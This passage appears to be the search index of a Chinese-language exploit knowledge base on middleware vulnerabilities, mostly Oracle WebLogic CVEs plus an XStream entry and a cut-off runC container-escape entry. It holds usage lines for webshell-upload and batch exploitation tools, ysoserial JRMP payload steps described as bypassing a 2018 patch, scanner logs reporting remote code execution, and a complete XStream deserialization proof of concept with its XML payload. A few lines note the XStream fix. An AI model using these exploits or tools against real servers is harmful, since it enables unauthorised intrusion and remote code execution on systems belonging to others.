cve-2019-2618_webshell.py http://1.1.1.1:7007/ weblogic Oracle@123 ======================================================================== _______ ________ ___ ___ __ ___ ___ __ __ ___ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |/ _ \\ |__ \\ / //_ |/ _ \\ | | \\ \\ / /| |__ ______ ) | | | || | (_) |______ ) / /_ | | (_) | | | \\ \\/ / | __|______/ /| | | || |\\__, |______/ / '_ \\| |> _ < | |____ \\ / | |____ / /_| |_| || | / / / /| (_) | | (_) | \\_____| \\/ |______| |____|\\___/ |_| /_/ |____\\___/|_|\\___/ Weblogic Upload Vuln(Need username password)-CVE-2019-2618 By Jas502n ======================================================================== >>>>Upload Shell Addresss: http://1.1.1.1:7007/bea_wls_internal/shell.jsp","title":"cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e (\u9700\u8981\u8d26\u6237\u5bc6\u7801)"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/#cve-2020-2551_pocpy-weblogic-iiop","text":"USE: zhzy@debian:$ python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001 +--------------------------------------------------- -----+ + USE: python cve-2020-2551_poc.py <url:port> + + VER: 10.3.6.0.0 + + 12.1.3.0.0 + + 12.2.1.3.0 + + 12.2.1.4.0 + + EXP: python3 cve-2020-2551_poc.py -u http://1.1.1.1:7001 + +-----------------------------------------------------------+ [+] found CVE-2020-2551 1.1.1.1:7007","title":"cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/","text":"CVE-2017-3506 & CVE-2017-10271 \u00b6 Affected Version \u00b6 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.2.0 Exp \u00b6 References \u00b6 1. https://secfree.com/article-635.html","title":"CVE-2017-3506 & CVE-2017-10271"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#cve-2017-3506-cve-2017-10271","text":"","title":"CVE-2017-3506 &amp; CVE-2017-10271"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#affected-version","text":"Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.2.0","title":"Affected Version"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#exp","text":"","title":"Exp"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2017-3506%20%26%20CVE-2017-10271/#references","text":"1. https://secfree.com/article-635.html","title":"References"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2628/","text":"CVE-2018-2628 \u00b6 testing exploit https://github.com/frohoff/ysoserial","title":"CVE-2018-2628"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2628/#cve-2018-2628","text":"testing exploit https://github.com/frohoff/ysoserial","title":"CVE-2018-2628"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/","text":"CVE-2018-2893 \u00b6 Tools author \u00b6 https://github.com/pyn3rd/CVE-2018-2893 Step 1 \u00b6 java -jar ysoserial-cve-2018-2893.jar WHY SO SERIAL? Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ JRMPClient @mbechler JRMPClient2 JRMPClient3 JRMPClient4 Jdk7u21 @frohoff Step 2 \u00b6 java -jar ysoserial-cve-2018-2893.jar JRMPClient4 \"<ip>:<port>\" > poc4.ser Step 3 \u00b6 python weblogic.py <host> <port> poc4.ser Note: Any one of JRMPClient2|JRMPClient3|JRMPClient4 can be utilized to bypass the Critical Patch Update April 2018. \u00b6","title":"CVE-2018-2893"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#cve-2018-2893","text":"","title":"CVE-2018-2893"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#tools-author","text":"https://github.com/pyn3rd/CVE-2018-2893","title":"Tools author"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-1","text":"java -jar ysoserial-cve-2018-2893.jar WHY SO SERIAL? Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ JRMPClient @mbechler JRMPClient2 JRMPClient3 JRMPClient4 Jdk7u21 @frohoff","title":"Step 1"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-2","text":"java -jar ysoserial-cve-2018-2893.jar JRMPClient4 \"<ip>:<port>\" > poc4.ser","title":"Step 2"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#step-3","text":"python weblogic.py <host> <port> poc4.ser","title":"Step 3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/CVE-2018-2893/#note-any-one-of-jrmpclient2jrmpclient3jrmpclient4-can-be-utilized-to-bypass-the-critical-patch-update-april-2018","text":"","title":"Note: Any one of  JRMPClient2|JRMPClient3|JRMPClient4 can be utilized to  bypass the Critical Patch Update April 2018."},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2019-2725-2729/","text":"weblogic CVE-2019-2725 CVE-2019-2729 POC \u6267\u884c\u547d\u4ee4\u5e76\u56de\u663e usage: \u5355\u4e2a\u76ee\u6807 python3 weblogic_get_webshell.py http://url \u6279\u91cf\u76ee\u6807\uff0c\u5c06\u6279\u91cfurl\u653e\u5165url_list.txt python3 weblogic_get_webshell.py all","title":"Index"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/WeblogicScanLot/","text":"\u8f6f\u4ef6\u4f5c\u8005\uff1aTide_RabbitMask \u514d\u8d23\u58f0\u660e\uff1aPia!(\uff4f \u2035-\u2032)\u30ce\u201d(\u30ce\ufe4f<\u3002) \u672c\u5de5\u5177\u4ec5\u7528\u4e8e\u5b89\u5168\u6d4b\u8bd5\uff0c\u8bf7\u52ff\u7528\u4e8e\u975e\u6cd5\u4f7f\u7528\uff0c\u8981\u4e56\u54e6~ V2.2\u7b80\u4ecb\uff1a \u63d0\u4f9bweblogic\u6279\u91cf\u68c0\u6d4b\u529f\u80fd\uff0c\u6536\u5f55\u51e0\u4e4e\u5168\u90e8weblogic\u5386\u53f2\u6f0f\u6d1e\u3002 \u3010\u6ca1\u6709\u9047\u5230\u8fc7weblogic\u6279\u91cf\u68c0\u6d4b\u5de5\u5177\u7684\u5c0f\u670b\u53cb\u4e3e\u8d77\u4f60\u7684\u722a\u722a\uff01\u3011 PS\uff1a \u7efc\u4e0a:V2.*\u7cfb\u5217\u4e0d\u662fV1.*\u7684\u5347\u7ea7\u7248\uff0c\u53ea\u662f\u591a\u8fdb\u7a0b\u6279\u91cf\u7248\u672c\u3002 \u5bf9\u4e8e\u5f53\u4e2a\u76ee\u6807\u7ad9\u70b9\u7684\u68c0\u6d4b\uff0c\u4f9d\u7136\u63a8\u8350\u60a8\u4f7f\u7528V1.*\u7cfb\u5217\u3002 V 2.*\u7cfb\u5217\u7279\u8272\uff1a 1.\u591a\u8fdb\u7a0b\u4efb\u52a1\u9ad8\u6548\u5e76\u53d1 2.\u7b80\u6d01\u76f4\u89c2\u7684\u76d1\u63a7\u754c\u9762 3.\u5065\u5168\u7684\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd 4.\u5065\u5168\u7684\u5f02\u5e38\u5904\u7406\u673a\u5236 V 2.*\u529f\u80fd\u8be6\u60c5\uff1a #\u63a7\u5236\u53f0\u8def\u5f84\u6cc4\u9732 Console #SSRF\uff1a CVE-2014-4210 #JAVA\u53cd\u5e8f\u5217\u5316 CVE-2016-0638 CVE-2016-3510 CVE-2017-3248 CVE-2018-2628 CVE-2018-2893 CVE-2019-2725 CVE-2019-2729 #\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 CVE-2018-2894 #XMLDecoder\u53cd\u5e8f\u5217\u5316 CVE-2017-3506 CVE-2017-10271 V 2.1\u66f4\u65b0\u65e5\u5fd7\uff1a \u7cfb\u5217\u91cd\u65b0\u5b9a\u4e49\u4e3aWeblogicScanLot\u7248\u672c\u3002 \u65b0\u589e\u5927\u91cf\u6210\u719fPOC\uff0c\u4e0eV1.3\u4fdd\u6301\u4e00\u81f4\u3002 \u540c\u6837\u65b0\u7248\u672c\u5b8c\u5168\u820d\u5f03Python2\u3002 \u65e5\u5fd7\u529f\u80fd\u91cd\u6784\uff0c\u66f4\u52a0\u5065\u58ee\u5b9e\u7528\u3002 Kill\u65e7\u7248\u672cwindow\u4e0b\u591a\u8fdb\u7a0b\u9002\u5e94\u6027BUG V 2.2\u66f4\u65b0\u65e5\u5fd7\uff1a \u65e5\u5fd7\u8f93\u51fa\u91cd\u505a\uff0c\u4e4b\u524d\u7684\u7248\u672c\u8fc1\u79fb\u5bfc\u81f4\u65e5\u5fd7\u5e76\u4e0d\u9002\u5408\u4f5c\u4e3a\u6279\u91cf\u626b\u63cf\u7ed3\u679c\uff0c \u5e0c\u671b\u8fd9\u6b21\u6539\u52a8\u53ef\u4ee5\u6ee1\u8db3\u5404\u4f4d\u8981\u6c42\uff0c\u5982\u6709bug issue\u7ee7\u7eed\u5b89\u6392~\u611f\u8c22\uff01 \u3010\u8f6f\u4ef6\u4f7f\u7528Demo\u3011 \u3010\u6b64\u5904\u53ea\u63d0\u4f9b\u4e86\u672c\u673a\u5355\u673a\u626b\u63cfdemo\uff0c\u591a\u7ebf\u7a0b\u5b9e\u6218\u573a\u9762\u592a\u8fc7\u8840\u8165\uff0c\u8bf7\u5728\u5bb6\u957f\u966a\u540c\u4e0b\u81ea\u884c\u4f53\u9a8c\u3011 #\u63a7\u5236\u53f0\uff1a ========================================================================= __ __ _ _ _ ____ \\ \\ / /__| |__ | | ___ __ _(_) ___ / ___| ___ __ _ _ __ \\ \\ /\\ / / _ \\ '_ \\| |/ _ \\ / _` | |/ __| \\___ \\ / __/ _` | '_ \\ \\ V V / __/ |_) | | (_) | (_| | | (__ ___) | (_| (_| | | | | \\_/\\_/ \\___|_.__/|_|\\___/ \\__, |_|\\___| |____/ \\___\\__,_|_| |_| |___/ By Tide_RabbitMask | V 2.2 Welcome To WeblogicScan !!! Whoami\uff1arabbitmask.github.io [*]\u4efb\u52a1\u52a0\u8f7d\u6210\u529f\uff0c\u76ee\u6807:127.0.0.1:7001 [*]\u4efb\u52a1\u68c0\u6d4b\u5b8c\u6210\uff0c\u76ee\u6807:127.0.0.1:7001 >>>>>End of task ========================================================================= #\u65e5\u5fd7\u6587\u4ef6\uff1a ========================================================================= 2019-07-28 14:57:48,702 [+]127.0.0.1:7001 console address is exposed! The path is: http://127.0.0.1:7001/console/login/LoginForm.jsp Please try weak password blasting! 2019-07-28 14:57:48,717 [+]127.0.0.1:7001 UDDI module is exposed! The path is: http://127.0.0.1:7001/uddiexplorer/ Please verify the SSRF vulnerability! 2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2016_0638. 2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2016_3510. 2019-07-28 14:57:48,717 [-]127.0.0.1:7001 not detected CVE_2017_3248. 2019-07-28 14:57:48,725 [-]127.0.0.1:7001 not detected CVE-2017-3506. 2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE-2017-10271. 2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE_2018_2628. 2019-07-28 14:57:48,731 [-]127.0.0.1:7001 not detected CVE_2018_2893. 2019-07-28 14:57:48,735 [-]127.0.0.1:7001 not detected CVE-2018-2894. 2019-07-28 14:57:48,914 [+]127.0.0.1:7001 has a JAVA deserialization vulnerability:CVE-2019-2725. 2019-07-28 14:57:49,133 [+]And your current permission is:rabbitmask\\rabbitmask. 2019-07-28 14:57:51,356 [+]127.0.0.1:7001 has a JAVA deserialization vulnerability:CVE-2019-2729. 2019-07-28 14:57:51,356 [+]And your current permission is:rabbitmask\\rabbitmask. =========================================================================","title":"Index"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/","text":"\u6f0f\u6d1e\u7f16\u53f7 \u00b6 CVE-2017-10271 \u5f71\u54cd\u8303\u56f4 \u00b6 \u5229\u7528 \u00b6 get\u8bf7\u6c42/wls-wsat/CoordinatorPortType\u754c\u9762\u521d\u6b65\u5224\u5b9a \u6293\u5305\u6dfb\u52a0http\u5934 Upgrade-Insecure-Requests: 1 Content-Type:text/xml \u4fee\u6539get\u4e3apost\u63d0\u4ea4payload","title":"Index"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/#_1","text":"CVE-2017-10271","title":"\u6f0f\u6d1e\u7f16\u53f7"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/#_2","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve-2017-10271/#_3","text":"get\u8bf7\u6c42/wls-wsat/CoordinatorPortType\u754c\u9762\u521d\u6b65\u5224\u5b9a \u6293\u5305\u6dfb\u52a0http\u5934 Upgrade-Insecure-Requests: 1 Content-Type:text/xml \u4fee\u6539get\u4e3apost\u63d0\u4ea4payload","title":"\u5229\u7528"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u524d\u8a00 \u00b6 XStream\u662f\u5e38\u7528\u7684Java\u7c7b\u5e93\uff0c\u7528\u6765\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u6210XML \uff08JSON\uff09\u6216\u53cd\u5e8f\u5217\u5316\u4e3a\u5bf9\u8c61\u3002 \u6f0f\u6d1e\u7b80\u4ecb \u00b6 Xstream 1.4.10\u7248\u672c\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCVE-2013-7285\u8865\u4e01\u7ed5\u8fc7\u3002 \u6f0f\u6d1e\u5371\u5bb3 \u00b6 \u5f53\u4f7f\u7528Xstream 1.4.10\u7248\u672c\u4e14\u672a\u5bf9\u5b89\u5168\u6846\u67b6\u8fdb\u884c\u521d\u59cb\u5316\u65f6\uff0c\u653b\u51fb\u8005\u5373\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5305\u5728\u4f7f\u7528Xstream\u7684\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002 \u5f71\u54cd\u8303\u56f4 \u00b6 \u4ea7\u54c1 \u00b6 Xstream \u7248\u672c \u00b6 Xstream1.4.10\u7248\u672c \u7ec4\u4ef6 \u00b6 Xstream \u6f0f\u6d1e\u590d\u73b0 \u00b6 PoC \u00b6 package com.bigo ; import com.thoughtworks.xstream.XStream ; import java.beans.EventHandler ; import java.io.IOException ; import java.util.Set ; import java.util.TreeSet ; /** * Created by cfchi on 2019/7/26. */ public class Main { public static String expGen (){ XStream xstream = new XStream (); Set < Comparable > set = new TreeSet < Comparable > (); set . add ( \"foo\" ); set . add ( EventHandler . create ( Comparable . class , new ProcessBuilder ( \"calc\" ), \"start\" )); String payload = xstream . toXML ( set ); System . out . println ( payload ); return payload ; } public static void main ( String [] args ) throws IOException { expGen (); XStream xStream = new XStream (); String payload = \"<sorted-set>\\n\" + \" <string>foo</string>\\n\" + \" <dynamic-proxy>\\n\" + \" <interface>java.lang.Comparable</interface>\\n\" + \" <handler class=\\\"java.beans.EventHandler\\\">\\n\" + \" <target class=\\\"java.lang.ProcessBuilder\\\">\\n\" + \" <command>\\n\" + \" <string>cmd.exe</string>\\n\" + \" <string>/c</string>\\n\" + \" <string>calc</string>\\n\" + \" </command>\\n\" + \" </target>\\n\" + \" <action>start</action>\" + \" </handler>\\n\" + \" </dynamic-proxy>\\n\" + \"</sorted-set>\\n\" ; xStream . fromXML ( payload ); } } 1.4.7\u7248\u672c\u767d\u540d\u5355 \u00b6 1.4.10\u7248\u672c\uff0c\u9ed1\u540d\u5355\u672a\u5f00\u542f \u00b6 1.4.11\u7248\u672c\uff0c\u9ed1\u540d\u5355\u5f00\u542f \u00b6 blacklist private class InternalBlackList implements Converter { private InternalBlackList () { } public boolean canConvert ( Class type ) { return type == Void . TYPE || type == Void . class || ! XStream . this . securityInitialized && type != null && ( type . getName (). equals ( \"java.beans.EventHandler\" ) || type . getName (). endsWith ( \"$LazyIterator\" ) || type . getName (). startsWith ( \"javax.crypto.\" )); } public void marshal ( Object source , HierarchicalStreamWriter writer , MarshallingContext context ) { throw new ConversionException ( \"Security alert. Marshalling rejected.\" ); } public Object unmarshal ( HierarchicalStreamReader reader , UnmarshallingContext context ) { throw new ConversionException ( \"Security alert. Unmarshalling rejected.\" ); } } \u4fee\u590d\u65b9\u6848 \u00b6 \u5347\u7ea7Xstream\u52301.4.11\u7248\u672c \u53c2\u8003 \u00b6 https://mp.weixin.qq.com/s/bght8tIwtNqnaidVZjPdSw http://x-stream.github.io/changes.html#1.4.11 \u539f\u6587\uff1a http://www.polaris-lab.com/index.php/archives/658/","title":"CVE 2019 10173 Xstream 1.4.10\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","text":"XStream\u662f\u5e38\u7528\u7684Java\u7c7b\u5e93\uff0c\u7528\u6765\u5c06\u5bf9\u8c61\u5e8f\u5217\u5316\u6210XML \uff08JSON\uff09\u6216\u53cd\u5e8f\u5217\u5316\u4e3a\u5bf9\u8c61\u3002","title":"\u524d\u8a00"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_2","text":"Xstream 1.4.10\u7248\u672c\u5b58\u5728\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCVE-2013-7285\u8865\u4e01\u7ed5\u8fc7\u3002","title":"\u6f0f\u6d1e\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_3","text":"\u5f53\u4f7f\u7528Xstream 1.4.10\u7248\u672c\u4e14\u672a\u5bf9\u5b89\u5168\u6846\u67b6\u8fdb\u884c\u521d\u59cb\u5316\u65f6\uff0c\u653b\u51fb\u8005\u5373\u53ef\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684\u8bf7\u6c42\u5305\u5728\u4f7f\u7528Xstream\u7684\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u3002","title":"\u6f0f\u6d1e\u5371\u5bb3"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_4","text":"","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_5","text":"Xstream","title":"\u4ea7\u54c1"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_6","text":"Xstream1.4.10\u7248\u672c","title":"\u7248\u672c"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_7","text":"Xstream","title":"\u7ec4\u4ef6"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_8","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","text":"package com.bigo ; import com.thoughtworks.xstream.XStream ; import java.beans.EventHandler ; import java.io.IOException ; import java.util.Set ; import java.util.TreeSet ; /** * Created by cfchi on 2019/7/26. */ public class Main { public static String expGen (){ XStream xstream = new XStream (); Set < Comparable > set = new TreeSet < Comparable > (); set . add ( \"foo\" ); set . add ( EventHandler . create ( Comparable . class , new ProcessBuilder ( \"calc\" ), \"start\" )); String payload = xstream . toXML ( set ); System . out . println ( payload ); return payload ; } public static void main ( String [] args ) throws IOException { expGen (); XStream xStream = new XStream (); String payload = \"<sorted-set>\\n\" + \" <string>foo</string>\\n\" + \" <dynamic-proxy>\\n\" + \" <interface>java.lang.Comparable</interface>\\n\" + \" <handler class=\\\"java.beans.EventHandler\\\">\\n\" + \" <target class=\\\"java.lang.ProcessBuilder\\\">\\n\" + \" <command>\\n\" + \" <string>cmd.exe</string>\\n\" + \" <string>/c</string>\\n\" + \" <string>calc</string>\\n\" + \" </command>\\n\" + \" </target>\\n\" + \" <action>start</action>\" + \" </handler>\\n\" + \" </dynamic-proxy>\\n\" + \"</sorted-set>\\n\" ; xStream . fromXML ( payload ); } }","title":"PoC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#147","text":"","title":"1.4.7\u7248\u672c\u767d\u540d\u5355"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#1410","text":"","title":"1.4.10\u7248\u672c\uff0c\u9ed1\u540d\u5355\u672a\u5f00\u542f"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#1411","text":"blacklist private class InternalBlackList implements Converter { private InternalBlackList () { } public boolean canConvert ( Class type ) { return type == Void . TYPE || type == Void . class || ! XStream . this . securityInitialized && type != null && ( type . getName (). equals ( \"java.beans.EventHandler\" ) || type . getName (). endsWith ( \"$LazyIterator\" ) || type . getName (). startsWith ( \"javax.crypto.\" )); } public void marshal ( Object source , HierarchicalStreamWriter writer , MarshallingContext context ) { throw new ConversionException ( \"Security alert. Marshalling rejected.\" ); } public Object unmarshal ( HierarchicalStreamReader reader , UnmarshallingContext context ) { throw new ConversionException ( \"Security alert. Unmarshalling rejected.\" ); } }","title":"1.4.11\u7248\u672c\uff0c\u9ed1\u540d\u5355\u5f00\u542f"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_9","text":"\u5347\u7ea7Xstream\u52301.4.11\u7248\u672c","title":"\u4fee\u590d\u65b9\u6848"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/XStream/CVE-2019-10173%20Xstream%201.4.10%E7%89%88%E6%9C%AC%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_10","text":"https://mp.weixin.qq.com/s/bght8tIwtNqnaidVZjPdSw http://x-stream.github.io/changes.html#1.4.11 \u539f\u6587\uff1a http://www.polaris-lab.com/index.php/archives/658/","title":"\u53c2\u8003"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/docker/docker-runC%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9ECVE-2019-5736/","text":"\u6f0f\u6d1e\u7b80\u8ff0\uff1a \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7279\u5b9a\u7684\u5bb9\u5668\u955c\u50cf\u6216\u8005exec\u64cd\u4f5c\u53ef\u4ee5\u83b7\u53d6\u5230\u5bbf\u4e3b\u673a\u7684runC\u6267\u884c\u65f6\u7684\u6587\u4ef6\u53e5\u67c4\u5e76\u4fee\u6539\u6389runc\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u5230\u5bbf\u4e3b\u673a\u7684root\u6267\u884c\u6743\u9650\u3002 \u5229\u7528\u6761\u4ef6\uff1a Docker\u7248\u672c < 18.09.2\uff0crunC\u7248\u672c< 1.0-rc6\u3002\uff08\u5728Docker 